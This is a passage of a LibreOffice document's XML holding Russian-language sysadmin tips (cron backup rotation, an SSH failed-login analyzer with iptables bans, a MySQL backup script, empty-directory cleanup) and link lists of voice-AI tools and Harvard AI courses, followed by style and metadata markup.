      <text:p text:style-name="P26">4. Запустите вручную, чтобы протестировать: /usr/local/bin/backup_rotate.sh</text:p>
      <text:p text:style-name="P26">5. Если всё работает как надо, добавьте задание в ``````bash</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">crontab``````bash</text:span></text:p>
      <text:p text:style-name="P26">для автоматического запуска. Например, чтобы делать бэкап каждый день в 3:00: sudo crontab -e</text:p>
      <text:p text:style-name="P26">И добавить строку: 0 3 * * * /usr/local/bin/backup_rotate.sh &gt;&gt; /var/log/backup_rotate.log 2&gt;&amp;1</text:p>
      <text:p text:style-name="P28">Здесь мы также перенаправляем вывод в лог-файл, чтобы отслеживать успешные и неуспешные запуски.</text:p>
      <text:p text:style-name="P27">5 нейросетей для озвучки и генерации голосов. Озвучить видео, создать голос для подкаста, склонировать свой тембр или начитать статью чужим голосом - теперь все это можно сделать без студий и оборудования. В сегодняшней подборке мы собрали 5 мощных инструментов, которые справятся с любой из этих задач за пару минут:</text:p>
      <text:p text:style-name="P27">1. ElevenLabs (https://www.elevenlabs.io/) - один из самых реалистичных голосовых ИИ. Поддерживает клон вашего голоса, эмоции и озвучку на разных языках. Идеален для дубляжа и подкастов.</text:p>
      <text:p text:style-name="P26">2. PlayHT (https://play.ht/) - студийное качество без студии. Есть готовые голоса и API. Часто используется в обучении и маркетинге.</text:p>
      <text:p text:style-name="P26">3. ResembleAI (https://www.resemble.ai/) - кастом под ключ: можно редактировать интонации, добавлять эмоции и настраивать речь по словам. Полезно для игр и виртуальных ассистентов.</text:p>
      <text:p text:style-name="P26">4. Speechify (https://speechify.com/) - озвучит все: от PDF до веб-страниц. Простой, понятный и поддерживает десятки голосов.</text:p>
      <text:p text:style-name="P28">5. LOVO (http://lovo.ai/) - заточен под рекламу и видео. Большая библиотека голосов, интеграции с видеоредакторами и поддержка эмоций.</text:p>
      <text:p text:style-name="P26">Bash-совет: анализ неудачных SSH-логинов и бан «горячих» IP. Хотите быстро узнать, какие IP вызывают максимум неудачных попыток входа в SSH, и оперативно заблокировать самых настырных? Ниже скрипт:</text:p>
      <text:p text:style-name="P26">#!/usr/bin/env bash</text:p>
      <text:p text:style-name="P26"># ssh_fail_analyzer.sh</text:p>
      <text:p text:style-name="P26"># Анализ неудачных SSH-попыток и вывод TOP-10 IP</text:p>
      <text:p text:style-name="P26">LOG_FILE="/var/log/auth.log" <text:s text:c="6"/># путь к логам (для CentOS: /var/log/secure)</text:p>
      <text:p text:style-name="P26">TOPN=10 <text:s text:c="27"/># сколько IP показывать</text:p>
      <text:p text:style-name="P26">echo "Топ $TOPN IP с неудачными SSH-входами:"</text:p>
      <text:p text:style-name="P26">grep -E "Failed password for" "$LOG_FILE" \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| grep -oP '(?&lt;=from )[\d\.]+' \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| sort \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| uniq -c \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| sort -rn \</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>| head -n "$TOPN"</text:p>
      <text:p text:style-name="P26">Как это работает:</text:p>
      <text:p text:style-name="P26">1. grep -E "Failed password for" - Ищем все строки с неудачными попытками.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. grep -oP '(?&lt;=from )\[\d.]+' - С помощью PCRE-регулярки достаём только IP-адреса после слова "from".</text:span></text:p>
      <text:p text:style-name="P26">3. sort | uniq -c | sort -rn - Сортируем, считаем вхождения и выводим в порядке убывания.</text:p>
      <text:p text:style-name="P26">4. head -n "\$TOPN" - Ограничиваем результат топ-10.</text:p>
      <text:p text:style-name="P26">Можно добавить в crontab ежедневный запуск и автоматическую отправку отчёта на почту или сразу бан «горячих» IP через iptables:</text:p>
      <text:p text:style-name="P26"># в crontab: каждый день в 00:10</text:p>
      <text:p text:style-name="P26">10 0 * * * /path/to/ssh_fail_analyzer.sh | mail -s "SSH Fail Report" admin@example.com</text:p>
      <text:p text:style-name="P26">Или сразу блокировать подозрительные IP, если они превысили порог:</text:p>
      <text:p text:style-name="P26">THRESHOLD=50</text:p>
      <text:p text:style-name="P26">for ip in $(grep -E "Failed password for" "$LOG_FILE" \</text:p>
      <text:p text:style-name="P26"><text:s text:c="14"/>| grep -oP '(?&lt;=from )[\d\.]+' \</text:p>
      <text:p text:style-name="P26"><text:s text:c="14"/>| sort | uniq -c \</text:p>
      <text:p text:style-name="P27"><text:s text:c="14"/>| awk -v t="$THRESHOLD" '$1 &gt; t {print $2}'); do</text:p>
      <text:p text:style-name="P27"><text:s text:c="2"/>iptables -I INPUT -s "$ip" -j DROP</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo "$(date): Заблокирован $ip за превышение $THRESHOLD неудачных попыток" &gt;&gt; /var/log/ssh_ban.log</text:p>
      <text:p text:style-name="P28">done</text:p>
      <text:p text:style-name="P26">Если у тебя есть сервер с MySQL/MariaDB, автоматический бэкап с ротацией, то вот простой скрипт, который:</text:p>
      <text:p text:style-name="P26">1. Делает дамп всех баз;</text:p>
      <text:p text:style-name="P26">2. Сохраняет в архив с датой;</text:p>
      <text:p text:style-name="P26">3. Удаляет архивы старше N дней:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># автор: https://t.me/bash_srv</text:p>
      <text:p text:style-name="P26"># Папка для бэкапов</text:p>
      <text:p text:style-name="P26">BACKUP_DIR="/opt/backups/mysql"</text:p>
      <text:p text:style-name="P26"># Кол-во дней хранения</text:p>
      <text:p text:style-name="P26">RETENTION_DAYS=7</text:p>
      <text:p text:style-name="P26"># Дата для имени файла</text:p>
      <text:p text:style-name="P26">DATE=$(date +'%Y-%m-%d_%H-%M')</text:p>
      <text:p text:style-name="P26"># Учетные данные</text:p>
      <text:p text:style-name="P26">DB_USER="root"</text:p>
      <text:p text:style-name="P26">DB_PASS="mypassword"</text:p>
      <text:p text:style-name="P26">mkdir -p "$BACKUP_DIR"</text:p>
      <text:p text:style-name="P26"># Делаем дамп</text:p>
      <text:p text:style-name="P26">mysqldump -u"$DB_USER" -p"$DB_PASS" --all-databases | gzip &gt; "$BACKUP_DIR/mysql_backup_$DATE.sql.gz"</text:p>
      <text:p text:style-name="P26"># Удаляем старые бэкапы</text:p>
      <text:p text:style-name="P26">find "$BACKUP_DIR" -type f -name "*.gz" -mtime +$RETENTION_DAYS -delete</text:p>
      <text:p text:style-name="P26">echo "Бэкап MySQL завершён: $DATE"</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T5">Рекомендуется повесить в крон, например, на каждый день в 3:00: 0 3 * * * /path/to/backup_mysql.sh</text:span></text:p>
      <text:p text:style-name="P26">Гарвард выкатил бесплатные курсы по AI и ML на 2025 год. Полный список доступных курсов:</text:p>
      <text:p text:style-name="P26">1. Введение в ИИ с Python - тут (https://www.edx.org/learn/artificial-intelligence/harvard-university-cs50-s-introduction-to-artificial-intelligence-with-python)</text:p>
      <text:p text:style-name="P26">2. Машинное обучение и ИИ с Python - тут (https://www.edx.org/learn/machine-learning/harvard-university-machine-learning-and-ai-with-python) </text:p>
      <text:p text:style-name="P26">3. Data Science: машинное обучение - тут (https://www.edx.org/learn/machine-learning/harvard-university-data-science-machine-learning)</text:p>
      <text:p text:style-name="P26">4. Data Science: капстоун-проект - тут (https://www.edx.org/learn/data-science/harvard-university-data-science-capstone)</text:p>
      <text:p text:style-name="P26">5. Анализ многомерных данных - тут (https://www.edx.org/learn/data-analysis/harvard-university-high-dimensional-data-analysis)</text:p>
      <text:p text:style-name="P27">6. Основы TinyML - тут (https://www.edx.org/learn/machine-learning/harvard-university-fundamentals-of-tinyml)</text:p>
      <text:p text:style-name="P27">7. Развертывание TinyML - тут (https://www.edx.org/learn/tinyml/harvard-university-deploying-tinyml)</text:p>
      <text:p text:style-name="P28">8. Применение TinyML - тут (https://www.edx.org/learn/tinyml/harvard-university-applications-of-tinyml)</text:p>
      <text:p text:style-name="P26">Bash совет дня: удаляем пустые директории рекурсивно. Когда на сервере скапливаются лишние пустые папки - это не только мусор, но и потенциальная головная боль при навигации и поиске. Вот простой способ зачистить их:</text:p>
      <text:p text:style-name="P26">#!/bin/bash</text:p>
      <text:p text:style-name="P26"># Путь, в котором нужно очистить пустые папки</text:p>
      <text:p text:style-name="P26">TARGET_DIR="/var/www/html"</text:p>
      <text:p text:style-name="P26"># Удаляем все пустые директории, включая вложенные</text:p>
      <text:p text:style-name="P26">find "$TARGET_DIR" -type d -empty -delete</text:p>
      <text:p text:style-name="P26">echo "Все пустые директории удалены из $TARGET_DIR"</text:p>
      <text:p text:style-name="P26">Как это работает:</text:p>
      <text:p text:style-name="P26">find ищет все папки (-type d), которые пусты (-empty) и удаляет их (-delete).</text:p>
      <text:p text:style-name="P26">Работает рекурсивно, удаляя даже вложенные пустые директории.</text:p>
      <text:p text:style-name="P26">Можно запускать из cron раз в неделю, например: 0 3 * * 0 /opt/scripts/clean_empty_dirs.sh</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Подзаголовок_20_Знак" style:display-name="Подзаголовок Знак" style:family="text">
      <style:text-properties fo:color="#5a5a5a" loext:opacity="100%" fo:font-size="12pt" fo:letter-spacing="0.026cm" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="Заголовок_20_1_20_Знак" style:display-name="Заголовок 1 Знак" style:family="text">
      <style:text-properties fo:color="#365f91" loext:opacity="100%" style:font-name="Cambria" fo:font-family="Cambria" style:font-pitch="variable" fo:font-size="16pt" style:font-size-asian="16pt" style:font-size-complex="16pt"/>
    </style:style>
    <style:style style:name="Unresolved_20_Mention" style:display-name="Unresolved Mention" style:family="text">
      <style:text-properties fo:color="#605e5c" loext:opacity="100%" style:font-name="Times New Roman" fo:font-family="'Times New Roman'" style:font-pitch="variable" fo:font-size="12pt" fo:background-color="#e1dfdd"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Текст_20_выноски_20_Знак" style:display-name="Текст выноски Знак" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Segoe UI" fo:font-family="'Segoe UI'" style:font-pitch="variable" fo:font-size="9pt" style:font-name-asian="Times New Roman2"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Нижний_20_колонтитул_20_Знак" style:display-name="Ниж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Верхний_20_колонтитул_20_Знак" style:display-name="Верх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26T20:40:25.927000000</meta:creation-date>
    <meta:generator>LibreOffice/24.8.4.2$Windows_X86_64 LibreOffice_project/bb3cfa12c7b1bf994ecc5649a80400d06cd71002</meta:generator>
    <dc:date>2025-06-26T21:54:32.773000000</dc:date>
    <meta:editing-duration>PT12M6S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="183" meta:paragraph-count="4690" meta:word-count="51664" meta:character-count="386922" meta:non-whitespace-character-count="337129"/>
    <meta:user-defined meta:name="AppVersion">16.0000</meta:user-defined>
  </office:meta>
</office:document-meta>
</file>